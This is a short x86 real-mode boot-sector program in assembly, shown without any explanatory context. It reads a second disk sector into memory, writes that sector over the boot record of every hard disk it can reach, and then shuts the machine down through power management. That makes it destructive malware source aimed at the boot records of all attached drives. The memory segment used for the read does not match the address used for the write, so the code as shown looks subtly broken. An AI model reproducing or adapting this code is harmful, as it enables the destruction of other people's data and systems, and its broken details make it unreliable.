BITS 16
ORG 0x7C00

; Copy the new bootloader into memory.
mov ax, 0x7E00
mov es, ax	; ES: 0x7E00 → copy it right next to the bootloader
mov ax, 0x0201	; AH: 0x02 → read disk sector
		; AL: 0x01 → one sector
mov cx, 0x0002	; CH: 0x00 → cylinder 0
		; CL: 0x02 → sector number 2
mov dx, 0x0000	; DH: 0x00 → head 0
		; DL: 0x00 → 0th drive (current)
mov bx, 0x00
int 0x13

; Write to all hard disks.
xor ax, ax
mov es, ax	; ES: 0x0000 → start at position 0
mov ax, 0x0301	; AH: 0x03 → write disk sector
		; AL: 0x01 → one sector
mov cx, 0x0001	; CH: 0x00 → cylinder 0
		; CL: 0x01 → sector number 1
xor dh, dh	; DH: 0x00 → head 0
mov bx, 0x7E00	; BX: 0x7E00 → we put it there before

mov dl, 0x80	; DL: 0x80 → 0th hard disk
FUCK:
	int 0x13	; Write to this hard disk.
	inc dl		; Keep fucking until overflow
	jnz FUCK

; Enable power management
mov ax, 0x5308	; Change state of power management
mov bx, 0x0001	; On all devices
mov cx, 0x0001	; To on
int 0x15

; Shut down
mov ax, 0x5307	; Set power state
mov bx, 0x0001	; On all devices
mov cx, 0x0003	; To off
int 0x15

jmp $	; Just in case

times 510-($-$$) db 0
dw 0xAA55
